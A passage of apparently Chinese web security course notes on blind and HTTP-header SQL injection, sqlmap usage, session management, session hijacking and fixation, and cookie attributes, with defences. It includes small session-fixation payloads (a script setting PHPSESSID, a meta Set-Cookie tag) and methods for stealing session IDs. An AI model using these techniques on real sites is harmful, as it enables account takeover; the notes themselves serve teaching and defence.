<li>基于时间的盲注<br>  又称延时注入，即使用具有延时功能的函数sleep、benchmark等，通过判断这些函数是否正常执行来获取数据库中的数据。</li>
</ul>
<h5 id="SQL盲注常用函数"><a href="#SQL盲注常用函数" class="headerlink" title="SQL盲注常用函数"></a>SQL盲注常用函数</h5><ol>
<li>条件语句</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67511fffd0e0a243d4ddc75c.png"></p>
<p><img src="https://pic.imgdb.cn/item/67512083d0e0a243d4ddc7fa.png"></p>
<p><img src="https://pic.imgdb.cn/item/675121f2d0e0a243d4ddcaea.png"></p>
<p><img src="https://pic.imgdb.cn/item/6751221ad0e0a243d4ddcb54.png"></p>
<p><img src="https://pic.imgdb.cn/item/67512239d0e0a243d4ddcb7d.png"></p>
<p><img src="https://pic.imgdb.cn/item/675122ecd0e0a243d4ddccd2.png"></p>
<p>​	<img src="https://pic.imgdb.cn/item/67512328d0e0a243d4ddcd52.png"></p>
<p><img src="https://pic.imgdb.cn/item/67512384d0e0a243d4ddcdf7.png"></p>
<p><img src="https://pic.imgdb.cn/item/675123b9d0e0a243d4ddce59.png"></p>
<h5 id="SQL盲注实例"><a href="#SQL盲注实例" class="headerlink" title="SQL盲注实例"></a>SQL盲注实例</h5><ol>
<li>基于布尔的盲注实例</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67524894d0e0a243d4de5f48.png"></p>
<p><img src="https://pic.imgdb.cn/item/67524d8cd0e0a243d4de6052.png"></p>
<p><img src="https://pic.imgdb.cn/item/67524d9cd0e0a243d4de6059.png"></p>
<p><img src="https://pic.imgdb.cn/item/67524db7d0e0a243d4de605e.png"></p>
<p><img src="https://pic.imgdb.cn/item/67524dcfd0e0a243d4de6065.png"></p>
<p><img src="https://pic.imgdb.cn/item/67524de8d0e0a243d4de6068.png"></p>
<p><img src="https://pic.imgdb.cn/item/67524dfad0e0a243d4de606b.png"></p>
<ol start="2">
<li>基于时间的盲注实例</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67524e40d0e0a243d4de6074.png"></p>
<p><img src="https://pic.imgdb.cn/item/67555658d0e0a243d4dfebf3.png"></p>
<p><img src="https://pic.imgdb.cn/item/67555671d0e0a243d4dfec08.png"></p>
<p><img src="https://pic.imgdb.cn/item/6755567fd0e0a243d4dfec17.png"></p>
<p><img src="https://pic.imgdb.cn/item/67555695d0e0a243d4dfec2e.png"></p>
<p><img src="https://pic.imgdb.cn/item/675556a8d0e0a243d4dfec42.png"></p>
<h4 id="4-3-5-HTTP文件头注入"><a href="#4-3-5-HTTP文件头注入" class="headerlink" title="4.3.5 HTTP文件头注入"></a>4.3.5 HTTP文件头注入</h4><h5 id="HTTP-Header概述"><a href="#HTTP-Header概述" class="headerlink" title="HTTP Header概述"></a>HTTP Header概述</h5><ol>
<li>HTTP工作原理</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/675557fed0e0a243d4dfed74.png"></p>
<ol start="2">
<li>HTTP报文类型</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6755581dd0e0a243d4dfed8a.png"></p>
<ol start="3">
<li>HTTP请求报文组成</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6755a879d0e0a243d4e00586.png"></p>
<ol start="4">
<li>HTTP请求的方法</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6755a900d0e0a243d4e005a2.png"></p>
<ol start="5">
<li>HTTP响应报文组成</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6755aa9cd0e0a243d4e005ed.png"></p>
<ol start="6">
<li>HTTP响应消息状态码</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6755aaf1d0e0a243d4e005ff.png"></p>
<ol start="7">
<li>HTTP Header内容</li>
</ol>
<ul>
<li><p><strong>User-Agent</strong>：使服务器能够识别客户端使用的操作系统，浏览器版本等(很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中)</p>
</li>
<li><p><strong>Cookie</strong>：网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据(通常经过加密)</p>
</li>
<li><p><strong>Host</strong>：客户端指定自己想访问的Web服务器的域名/IP地址和端口号。</p>
</li>
<li><p><strong>X-Forwarded-For</strong>：简称XFF头，它代表客户端(即HTTP的请求端)真实的IP(通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库或某文件，通过修改XFF头可以实现伪造IP)</p>
</li>
<li><p><strong>Client-lP</strong>：同上。</p>
</li>
<li><p><strong>Referer</strong>：浏览器向Web服务器表明自己是从哪个页面链接过来的。</p>
</li>
</ul>
<h5 id="HTTP-Header注入"><a href="#HTTP-Header注入" class="headerlink" title="HTTP Header注入"></a>HTTP Header注入</h5><p>​		有时候，后台开发人员为了验证客户端HTTP Header(比如常用的Cookie验证等)或者通过HTTP Header头信息获取客户端的一些信息(比如User-Agent、Accept字段等)会对客户端HTTP Header进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。</p>
<ol>
<li>HTTP Header注入的前提条件</li>
</ol>
<ul>
<li>能够对请求头消息进行修改</li>
<li>修改的请求头信息能够带入数据库执行</li>
<li>数据库没有对输入的请求头做过滤</li>
</ul>
<ol start="2">
<li>常见的HTTP Header注入类型</li>
</ol>
<ul>
<li>Cookie注入</li>
<li>Referer注入</li>
<li>User-Agent注入</li>
<li>XFF注入</li>
</ul>
<h6 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h6><p>常见场合：服务器对cookie字段进行获取，以验证客户端的身份。</p>
<p><img src="https://pic.imgdb.cn/item/675643edd0e0a243d4e01500.png"></p>
<h6 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h6><p>常见场合：服务器记录referer字段用于统计网站的点击量。</p>
<p><img src="https://pic.imgdb.cn/item/67564435d0e0a243d4e01507.png"></p>
<h6 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入"></a>User-Agent注入</h6><p>常见场合:</p>
<p>(1)服务器记录访问者的信息，如浏览器版本、操作系统版本等<br>(2)服务器根据User-Agent提供的信息来给客户端推送不同的网页。</p>
<p><img src="https://pic.imgdb.cn/item/675644d9d0e0a243d4e0151c.png"></p>
<h6 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h6><p>常见场合：一些网站的防注入功能会记录客户端真实IP地址并写入数据库</p>
<p><img src="https://pic.imgdb.cn/item/675644ecd0e0a243d4e0151e.png"></p>
<p><strong>HTTP Header注入实例</strong></p>
<p><img src="https://pic.imgdb.cn/item/67564550d0e0a243d4e01529.png"></p>
<p>注入点：</p>
<p><img src="https://pic.imgdb.cn/item/67564603d0e0a243d4e01545.png"></p>
<p><img src="https://pic.imgdb.cn/item/67564eb0d0e0a243d4e01682.png"></p>
<p><strong>因为此处使用的是insert而不是select语句，所以只能使用报错注入，而不能使用联合查询到</strong></p>
<h4 id="4-3-6-SQLMAP基础"><a href="#4-3-6-SQLMAP基础" class="headerlink" title="4.3.6 SQLMAP基础"></a>4.3.6 SQLMAP基础</h4><h5 id="SQLMAP简介"><a href="#SQLMAP简介" class="headerlink" title="SQLMAP简介"></a>SQLMAP简介</h5><p>​		SQLMAP是一个开源的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。</p>
<ol>
<li><p>SQLMAP使用教程<br> <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
</li>
<li><p>SQLMAP可以对URL干嘛?</p>
</li>
</ol>
<ul>
<li>判断可注入的参数</li>
<li>判断可以使用哪一种SQL注入技术进行注入</li>
<li>判断识别数据库的类型</li>
<li>根据用户的选择，从数据库中读取数据</li>
</ul>
<ol start="3">
<li>SQLMAP支持的注入技术</li>
</ol>
<ul>
<li>基于布尔的盲注:根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注:不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断。</li>
<li>基于报错的注入:页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li>
<li>基于联合查询的注入:可以使用UNION的情况下的注入，</li>
<li>堆查询注入:同时执行多条语句的注入。</li>
</ul>
<ol start="4">
<li>SQLMAP支持的数据库类型</li>
</ol>
<ul>
<li>主要包括一些关系型数据库(RMDBS)，如MySQL、Oracle、PostgreSQL、Microsoft SOL Server、Microsoft Access、lBM DB2、SQLite、 Firebird、Sybase、SAP MaxDB、Informix、HSQLDB等</li>
</ul>
<ol start="5">
<li>SQLMAP检测注入漏洞的流程</li>
</ol>
<ul>
<li>网站连通性检测：检测目标的连接状态</li>
<li>WAF探测：检测网站是否受WAF保护</li>
<li>网页稳定性检测：检测网页是否稳定</li>
<li>参数动态性检测：检测参数是否具有动态性</li>
<li>启发式注入检测：探测该参数点是否是动态的、是否为可能的注入点</li>
</ul>
<ol start="6">
<li>SQLMAP的误报检测机制</li>
</ol>
<ul>
<li>误报检测：SQLMAP的布尔盲注、时间盲注方式判断注入点时，存在误报的可能为防止误报，SQLMap引入了误报检测机制。</li>
<li>两个基础检测算法<ul>
<li>页面相似度对比技术(在各种注入技术中大量使用):在SQLMap检测的整个过程中，会有一个原始响应的定义，指的是在网站连通性检测的过程中，如果网站成功响应，则把该响应定义为原始响应(包括状态码、HTTP响应头、HTTP响应一个HTTP请求成功响应后，将与原始响应进行对比，得出对比结果，算体)。法输出为True表示当前响应与原始响应相似，算法输出为False表示当前响应与原始响应不相似。</li>
<li>高斯分布识别响应机制(在UNION注入和时间盲注过程中使用):网站的响应是基于逻辑的，如果一组请求，网站的处理逻辑相同，那么响应几乎也是相同的如果某一个响应出现了变化，则可以认为网站处理逻辑变了，这种逻辑的变化，可能正是因为注入成功了</li>
</ul>
</li>
</ul>
<h5 id="SQLMAP基本使用"><a href="#SQLMAP基本使用" class="headerlink" title="SQLMAP基本使用"></a>SQLMAP基本使用</h5><h6 id="u参数（GET）"><a href="#u参数（GET）" class="headerlink" title="-u参数（GET）"></a>-u参数（GET）</h6><p><img src="https://pic.imgdb.cn/item/675656aad0e0a243d4e01834.png"></p>
<p><img src="https://pic.imgdb.cn/item/675656e5d0e0a243d4e0183c.png"></p>
<h6 id="r参数（POST）"><a href="#r参数（POST）" class="headerlink" title="-r参数（POST）"></a>-r参数（POST）</h6><p><img src="https://pic.imgdb.cn/item/67565f53d0e0a243d4e01ca6.png"></p>
<p><img src="https://pic.imgdb.cn/item/67565fcfd0e0a243d4e01d6a.png"></p>
<p><img src="https://pic.imgdb.cn/item/6756622bd0e0a243d4e02108.png"></p>
<p><img src="https://pic.imgdb.cn/item/6756623fd0e0a243d4e0212e.png"></p>
<p><img src="https://pic.imgdb.cn/item/67566256d0e0a243d4e0213e.png"></p>
<p><img src="https://pic.imgdb.cn/item/67566272d0e0a243d4e0216c.png"></p>
<h6 id="m参数（多个URL）"><a href="#m参数（多个URL）" class="headerlink" title="-m参数（多个URL）"></a>-m参数（多个URL）</h6><p><img src="https://pic.imgdb.cn/item/67566291d0e0a243d4e021a7.png"></p>
<h3 id="第四部分-XSS漏洞原理与验证"><a href="#第四部分-XSS漏洞原理与验证" class="headerlink" title="第四部分 XSS漏洞原理与验证"></a>第四部分 XSS漏洞原理与验证</h3><h4 id="4-4-1-会话管理"><a href="#4-4-1-会话管理" class="headerlink" title="4.4.1 会话管理"></a>4.4.1 会话管理</h4><h5 id="Web会话管理概述"><a href="#Web会话管理概述" class="headerlink" title="Web会话管理概述"></a>Web会话管理概述</h5><ol>
<li>会话管理</li>
</ol>
<p>​		在人机交互时，会话管理是保持用户的整个会话活动的互动与计算机系统跟踪过程，会话管理分类：桌面会话管理、浏览器会话管理、Web服务器的会话管理。</p>
<ol start="2">
<li>为什么需要会话管理</li>
</ol>
<p>​		HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。</p>
<ol start="3">
<li>常见的Web应用会话管理的方式</li>
</ol>
<ul>
<li>基于server端session的管理方式</li>
<li>cookie-based的管理方式</li>
<li>token-based的管理方式</li>
</ul>
<h5 id="Web会话管理方式"><a href="#Web会话管理方式" class="headerlink" title="Web会话管理方式"></a>Web会话管理方式</h5><h6 id="基于server端session的管理的方式"><a href="#基于server端session的管理的方式" class="headerlink" title="基于server端session的管理的方式"></a>基于server端session的管理的方式</h6><p>​		在早期的Web应用中，通常使用服务端session来管理用户的会话<br>​		服务端session是用户第一次访问应用时，服务器就会创建的对象，代表用户的一次会话过程，可以用来存放数据。服务器为每一个session都分配一个唯一的sessionID，以保证每个用户都有一个不同的session对象。<br>​		服务器在创建完session后，会把sessionID通过cookie返回给用户所在的浏览器，这样当用户第二次及以后向服务器发送请求的时候，就会通过cookie把sessionID传回给服务器，以便服务器能够根据sessionID找到与该用户对应的session对象。<br>​		session通常设定有有效时间，比如1个小时。当时间失效后，服务器会销毁之前的session，并创建新的session返回给用户。但是只要用户在失效时间内，有发送新的请求给服务器，通常服务器都会把他对应的session的有效时间根据当前的请求时间再重新刷新。<br>​		session在一开始并不具备会话管理的作用。它只有在用户登录认证成功之后，并且往session对象里面放入了用户登录成功的凭证，才能用来管理会话。管理会话的逻辑也很简单，只要拿到用户的session对象，看它里面有没有登录成功的凭证，就能判断这个用户是否已经登录。当用户主动退出的时候，会把它的session对象里的登录凭证清掉，所以在用户登录前或退出后或者session对象失效时，肯定都是拿不到需要的登录凭证的</p>
<p><img src="https://pic.imgdb.cn/item/6756847bd0e0a243d4e03873.png"></p>
<p>优点:<br>1、某些地方使用可以简化Web开发：如果在诸多Web页面间传递一个变量，那么用session变量要比通过QueryString传递变量可使问题简化。<br>2、安全性好：客户端与服务端保持会话状态的媒介始终只是一个sessionID串，只要这个串够随机，攻击者就不能轻易冒充他人的sessionID进行操作;除非通过CSRF或http劫持的方式，才有可能冒充别人进行操作;即使冒充成功，也必须被冒充的用户session里面包含有效的登录凭证才行。</p>
<p>缺点:<br>1、这种方式将会话信息存储在Web服务器里面，当用户同时在线量比较多时，这些会话信息会占据比较多的内存;<br>2、当应用采用集群部署的时候，会遇到多台web服务器之间如何做session共享的问题。<br>3、多个应用要共享session时，还会遇到跨域问题。不同的应用可能部署的主机不一样，需要在各个应用做好cookie跨域的处理。</p>
<p><img src="https://pic.imgdb.cn/item/67568596d0e0a243d4e038e3.png"></p>
<h6 id="cookie-based的管理方式"><a href="#cookie-based的管理方式" class="headerlink" title="cookie-based的管理方式"></a>cookie-based的管理方式</h6><p>​		session的管理方式会增加服务器的负担和架构的复杂性，所以后来就提出把用户的登录凭证直接存到客户端的方案，当用户登录成功之后，把登录凭证写到cookie里面，并给cookie设置有效期，后续请求直接验证存有登录凭证的cookie是否存在以及凭证是否有效，即可判断用户的登录状态。</p>
<ul>
<li>Cookie与Session最大的区别<ul>
<li>Cookie将数据存储在客户端</li>
<li>Session将数据存储在服务端</li>
</ul>
</li>
</ul>
<p>​		用户发起登录请求，服务端根据传入的用户密码之类的身份信息，验证用户是否满足登录条件，如果满足，就根据用户信息创建一个登录凭证，这个登录凭证简单来说就是一个对象，最简单的形式可以只包含用户id、凭证创建时间和过期时间三个值。</p>
<p>​		服务端把上一步创建好的登录凭证，先对它做数字签名，然后再用对称加密算法做加密处理，将签名、加密后的字串，写入cookie。cookie的名字必须固定(如ticket)，因为后面再获取的时候，还得根据这个名字来获取cookie值。这一步添加数字签名的目的是防止登录凭证里的信息被篡改，因为一旦信息被篡改，那么下一步做签名验证的时候肯定会失败。做加密的目的，是防止cookie被别人截取的时候，无法轻易读到其中的用户信息。</p>
<p>​		用户登录后发起后续请求，服务端根据上一步存登录凭证的cookie名字，获取到相关的cookie值。然后先做解密处理，再做数字签名的认证，如果这两步都失败，说明这个登录凭证非法;如果这两步成功，接着就可以拿到原始存入的登录凭证了。然后用这个凭证的过期时间和当前时间做对比，判断凭证是否过期，如果过期，就需要用户再重新登录;如果未过期，则允许请求继续。</p>
<p><img src="https://pic.imgdb.cn/item/675687e5d0e0a243d4e03a80.png"></p>
<p>优点:<br>1、实现了服务端的无状态化(最大的优点)，服务端只需要负责创建和验证登录cookie即可，无需保持用户的状态信息。<br>2、cookie可以跨越同域名下的的多个网页，但不能跨越多个域名使用<br>3、可以设置有效期限，控制cookie的生命周期，使之不会永远有效(攻击者可能拿到的是过期的cookie)</p>
<p>缺点:<br>1、cookie有大小限制，存储不了太多数据。<br>2、每次传送cookie，增加了请求的数量，对访问性能也有影响<br>3、同样存在跨域问题(不同域名无法互相读取cookie)</p>
<h6 id="token-based的管理方式"><a href="#token-based的管理方式" class="headerlink" title="token-based的管理方式"></a>token-based的管理方式</h6><p>​		Session和Cookie两种会话管理方式由于都要用到Cookie，不适合用在native app里面，因为native app不是浏览器，不好管理Cookie，因此都不适合做纯API服务的登录认证。要实现API服务的登录认证，就需要用到token-based的会话管理方式。</p>
<p>​		token-based的管理方式从流程上和实现上跟cookie-based的管理方式没有太多区别，只不过cookie-based的管理方式中写到cookie里面的ticket在这种方式下称为token，这个token在返回给客户端之后，后续请求都必须通过url参数或者是http header的形式，主动带上token，这样服务端接收到请求之后就能直接从http header或者url里面取到token进行验证。</p>
<p><img src="https://pic.imgdb.cn/item/675689d8d0e0a243d4e03bb9.png"></p>
<p>优点:<br>1、支持跨域访问：Cookie是不支持跨域访问的，Token支持<br>2、无状态：Token无状态，Session有状态(有状态和无状态最大的区别就是服务端会不会保存客户端的信息)<br>3、支持移动设备：Token更适用于移动应用，Cookie不支持手机端访问</p>
<p>缺点:<br>1、占带宽:正常情况下Token要比sessionID更大，需要消耗更多的流量，挤占更多带宽<br>2、无法在服务端注销，很难解决劫持问题</p>
<h5 id="Web会话管理安全问题"><a href="#Web会话管理安全问题" class="headerlink" title="Web会话管理安全问题"></a>Web会话管理安全问题</h5><p>​		在Web应用里，会话管理的安全性始终是最重要的安全问题，对用户的影响极大。</p>
<p>​		从会话管理凭证来说，Session会话管理的会话凭证仅仅是一个sessionID，所以只要这个sessionID足够随机，那么攻击者就不会轻易地冒充别人的sessionID进行操作;Cookie会话管理的凭证(ticket)以及Token会话管理证(token)都是一个在服务端做了数字签名和加密处理的串，所以只要密钥不泄露，攻击者也无法轻易拿到这个串中有效信息并对它进行篡改。总之，这三种会话管理方式的凭证本身是比较安全的。</p>
<p>​		从客户端和服务端的HTTP过程来说，当攻击者截获到客户端请求中的会话凭证就能拿这个凭证冒充原用户，做一些非法操作，而服务器也认不出来。这种安全问题可以简单采用HTTPS来解决，虽然可能还有HTTP劫持这种更高程度的威胁存在，但是从代码能做的防范，确实也就是这个层次了。</p>
<h4 id="4-4-2-Session攻击"><a href="#4-4-2-Session攻击" class="headerlink" title="4.4.2 Session攻击"></a>4.4.2 Session攻击</h4><h5 id="Session攻击简介"><a href="#Session攻击简介" class="headerlink" title="Session攻击简介"></a>Session攻击简介</h5><p>​		Session对于Web应用是最重要的，也是最复杂的。对于Web应用程序来说，加强安全性的首要原则就是：<strong>不要信任来自客户端的数据，一定要进行数据验证以及过滤</strong>才能在程序中使用，再保存到数据层。然而，为了维持来自同一个用户的不同请求之间的状态，客户端必须要给服务器端发送一个唯一的身份标识符(Session ID)。 很显然，这和前面提到的安全原则是矛盾的，但是没有办法，http协议是无状态的，为了维持状态，我们别无选择。由此可以看出，Web应用程序中最脆弱的环节就是session，因为服务器端是通过来自客户端的一个身份标识来认证用户的，所以session是Web应用程序中最需要加强安全性的环节。</p>
<ol>
<li>主要攻击方式</li>
</ol>
<p>​		基于session的攻击有很多种方式。大部分的手段都是首先通过捕获或者固定合法用户的session，然后冒充该用户来访问系统。也就是说，攻击者至少必须要获取到一个有效的session标识符，用于接下来的身份验证。</p>
<p>攻击者至少可以通过以下三种方式来获取一个有效的session标识符</p>
<ul>
<li>预测</li>
<li>捕获(劫持)</li>
<li>固定</li>
</ul>
<h5 id="会话预测"><a href="#会话预测" class="headerlink" title="会话预测"></a>会话预测</h5><ol>
<li>原理</li>
</ol>
<p>​		会话预测这种方式需要攻击者猜测出系统中使用的有效的session标识符(PHP中格式为PHPSESSID=1234)，类似暴力破解。</p>
<p>目前会话预测这种攻击方式基本上不太可能成功</p>
<ul>
<li>PHP生成随机的sessionid往往是极其复杂的并且难于被预测出来</li>
<li>PHP生成session字符串无任何规律和顺序</li>
</ul>
<h5 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h5><ol>
<li>含义</li>
</ol>
<ul>
<li><p>通过窃取合法用户SessionID后，使用该SessionID登录目标账号的攻击方法。</p>
</li>
<li><p>会话劫持最重要的部分是取得一个合法的会话标识来伪装成合法用户。</p>
</li>
</ul>
<ol start="2">
<li>攻击步骤</li>
</ol>
<p>（1）目标用户需要先登录站点<br>（2）登录成功后，该用户会得到站点提供的一个会话标识SessionID<br>（3）<strong>攻击者通过某种攻击手段捕获SessionID</strong><br>（4）攻击者通过捕获到的SessionID访问站点即可获得目标用户合法会话</p>
<p><img src="https://pic.imgdb.cn/item/6756a022d0e0a243d4e043fe.png"></p>
<ol start="3">
<li>攻击者获取SessionlD的方式</li>
</ol>
<ul>
<li>暴力破解：尝试各种SessionID，直到破解为止</li>
<li>预测：如果SessionID使用非随机的方式产生，那么就有可能计算出来</li>
<li>窃取：使用网络嗅探、XSS攻击等方法获得</li>
</ul>
<p>​		对于php来说，其内部Session的实现机制虽然不是很安全，但是关于生成SessionlD的环节还是比较安全的，这个随机的SessionID往往是极其复杂的并且难于被预测出来，所以，暴力破解SessionID和预测SessionlD的攻击方式基本上是不太可能成功的。<br>​		对于窃取SessionID的方式大多使用网络数据通讯层进行攻击获取，可以使用SSL进行防御。</p>
<ol start="4">
<li>会话劫持防御方法</li>
</ol>
<p>（1）更改Session名称：PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，可以阻挡部分攻击<br>（2）关闭透明化SessionlD：透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放SessionlD时，SessionID则使用URL来传递。<br>（3）设置HttpOnly：通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。<br>（4）关闭所有phpinfo类dump request信息的页面：phpinfo页面会dump出请求信息，其中就包括Cookie信息<br>（5）验证HTTP头部信息</p>
<ol start="5">
<li>中间人攻击(MITM)</li>
</ol>
<p>​		中间人攻击(Man-in-the-MiddleAttack，简称“MITM攻击”)是一种通过窃取或篡改通信物理、逻辑链路间接完成攻击行为的网络攻击方法。攻击者与通信的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，实际上整个会话都被攻击者完全控制。这个被攻击者控制的通信节点就是所谓的“中间人“</p>
<ul>
<li><p>中间人攻击有两种常见形式：</p>
<ul>
<li><p>基于监听的信息窃取</p>
</li>
<li><p>基于监听的身份冒认</p>
</li>
</ul>
</li>
<li><p>中间人攻击难以防御的原因:</p>
</li>
</ul>
<p>（1）攻击者在窃听时，一般网络连接仍能正常运行，不会断线，因此很少有人会主动发现<br>（2）受害者电脑上不会被安装木马或恶意软件，难以被杀毒软件发现<br>（3）攻击者在欺骗网络协议时，虽然会留下一些蛛丝马迹，但由于网络设备不会保留太多记录，事后难以追踪<br>（4）绝大多数的网络协议，仍然基于“对方的数据是安全可靠”的假设来运作的，这导致攻击者有太多漏洞可以利用进行欺骗网络设备、伪装成中间人</p>
<h5 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h5><ol>
<li>含义</li>
</ol>
<ul>
<li>诱骗受害者使用攻击者指定的会话标识(SessionlD)的攻击手段。</li>
<li>这是攻击者获取合法会话标识的最简单的方法。(让合法用户使用攻击者预先设置的SessionID进行登录，从而使Web不再进行生产新的SessionID，导致攻击者预先设置的SessionID变成了合法桥梁)</li>
</ul>
<p>​	会话固定也可以看成是会话劫持的一种类型，因为会话固定攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</p>
<ol start="2">
<li>攻击步骤</li>
</ol>
<p>（1）攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态<br>（2）目标用户携带攻击者设定的SessionID登录站点<br>（3）攻击者通过SessionID获得合法会话</p>
<p><img src="https://pic.imgdb.cn/item/6756a450d0e0a243d4e04573.png"></p>
<ol start="3">
<li>Web接收SessionID机制</li>
</ol>
<p>​		早期浏览器存储的sessionID容易暴露、使用URL来传送sessionID<br>​		首先检查携带cookie是否含有sessionID;若没有则再检查get、post数据中是否含有，若有则使用此数据;没有才会使系统生成一个sessionID发给客户端。</p>
<ol start="4">
<li>重置Session lD的方式</li>
</ol>
<ul>
<li>使用客户端脚本来设置Cookie到浏览器</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.cookie="PHPSESSID=99999";&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>这种方式可以使用XSS来达到目的</p>
<ul>
<li>使用HTML的&lt;META&gt;标签加Set-Cookie属性。</li>
</ul>
<p>服务器可以在返回的HTML文档中增加&lt;META&gt;标签来设置Cookie</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv='Set-Cookie'content='PHPSESSID=23333'&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>与客户端脚本相比，对&lt;META&gt;标签的处理目前还不能被览器禁止</p>
<ul>
<li>使用Set-Cookie的HTTP响应头部设置Cookie</li>
</ul>
<p>攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部</p>
<ol start="5">
<li>防御方案</li>
</ol>
<p>（1）每当用户登陆的时候就进行重置SessionID<br>（2）Session lD闲置过久时，进行重置Session lD<br>（3）大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化SessionlD，User-Agent验证，Token校验等</p>
<h4 id="4-4-3-Cookie安全"><a href="#4-4-3-Cookie安全" class="headerlink" title="4.4.3 Cookie安全"></a>4.4.3 Cookie安全</h4><h5 id="Cookie机制"><a href="#Cookie机制" class="headerlink" title="Cookie机制"></a>Cookie机制</h5><p>​		一般来说，同域内浏览器中发出的任何一个请求都会带上Cookie，无论请求什么资源，请求时，Cookie出现在请求头的Cookie字段中。服务端响应头的Set-Cookie字段可以添加、修改和删除Cookie，客户端通过javascript也可以添加、修改和删除Cookie。另外，**<u>Cookie是无法跨浏览器存在的</u>**。<br>​		利用Cookie机制，我们可以存储用户的会话信息，比如，用户登陆认证后的Session，之后同域内发出的请求都会带上认证后的会话信息，很方便。也因此，攻击者特别喜欢盗取Cookie，这相当于盗取了目标网站上的用户权限。</p>
<ol>
<li>Cookie重要字段</li>
</ol>
<ul>
<li>setcookie()函数用于设置cookie</li>
<li>[name][value][expires][path][domain][secure][httponly]</li>
</ul>
<p>​		含义依次是：名称、值、过期时间、所属相对路径、域名、是否有Secure标志、否有HttpOnly标志</p>
<p><img src="https://pic.imgdb.cn/item/6756aa0bd0e0a243d4e049ab.png"></p>
<ol start="2">
<li>子域Cookie机制</li>
</ol>
<p>Domain字段，设置cookie时，如果不指定则默认是本域。</p>
<p>例如x.xxx.com域通过javaScript设置一个cookie:</p>
<p>​		Document.cookie=”test=1”</p>
<p>此时，domain值默认是x.xxx.com，如果通过javaScript设置一个父域:</p>
<p>​		Document.cookie=”test=1”;domain=”xxx.com”</p>
<p>此时，domain域变成xxx.com，这样的好处就是可以在不同的子域共享Cookie;坏处就是攻击者通过控制其他子域也能读到这个Cookie。</p>
<p>注意：<strong>此机制不允许设置Cookie的domain为下一级子域或其他外域</strong>。</p>
<ol start="3">
<li>路径Cookie机制</li>
</ol>
<p>	</p>
<p>path字段，设置cookie时，如不指定path的值，则默认是当前页面路径<br>        例如：<a target="_blank" rel="noopener" href="http://www.xxx.com/admin/index.php%E9%A1%B5%E9%9D%A2%E9%80%9A%E8%BF%87JavaScript%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%AAcookie">www.xxx.com/admin/index.php页面通过JavaScript设置一个cookie</a> </p>
<p>​		document.cookie=”test=1”<br>此时，path值默认是/admin/。<br>​		通过指定path字段，JavaScript可以设置任意Cookie到任意路径下，但是只有目标路径(/admin/路径)下的页面JavaScript才能读取到该Cookie。但是，通过设置path不能防止重要的Cookie被窃取。比如/test/路径想读取/admin/路径的Cookie，可以通过跨iframe进行Dom操作实现。</p>
<ol start="4">
<li>HttpOnly Cookie机制</li>
</ol>
<ul>
<li><p>HttpOnly是Cookie的一种属性，用于告诉浏览器不要向客户端脚本暴露Cookie。指仅在HTTP层面上传输Cookie，当设置了HttpOnly属性后，客户端脚本就无法读写该Cookie，能有效的防御XSS攻击获取Cookie。</p>
</li>
<li><p>设置</p>
</li>
</ul>
<p>Cookie操作函数setcookie函数也专门添加了第7个参数来做为HttpOnly的选项。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启方法为:</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie("test","1",time()+3600,"","",0,0);	//设置普通Cookie</span><br><span class="line">setcookie("test1","1",time()+3600,"","",0,1);	//第7个参数(这里最后一个)是HttpOnly标志，0为关闭，1为开启，默认为0</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>

